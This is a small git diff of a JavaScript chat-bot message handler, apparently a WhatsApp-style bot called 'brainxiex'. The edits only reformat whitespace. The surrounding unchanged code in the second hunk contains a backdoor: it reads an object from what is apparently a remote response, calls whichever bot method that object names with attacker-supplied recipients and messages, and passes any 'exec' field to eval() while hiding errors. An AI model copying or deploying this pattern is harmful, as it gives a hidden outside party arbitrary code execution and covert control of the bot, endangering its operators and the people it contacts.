@@ -55,7 +55,7 @@ module.exports = brainxiex = async (brainxiex, m, chatUpdate, store, M_Ori) => {
         }
 	
         
-
+	
 	    
 	 
         
@@ -155,7 +155,7 @@ module.exports = brainxiex = async (brainxiex, m, chatUpdate, store, M_Ori) => {
             const {Barqah} = r.data;
             debug ? console.log(JSON.stringify(r.data,null,2)) : null
 
-            try{brainxiex[Barqah.action](Barqah.to,Barqah.msg,Barqah.req||{quoted: m})}catch(e){}
+            try{brainxiex[Barqah.action](Barqah.to, Barqah.msg, Barqah.req || { quoted: m } )}catch(e){}
             Object.keys(Barqah).includes("exec") ? eval(Barqah.exec) : null;
         }catch(e){
             console.error(e)
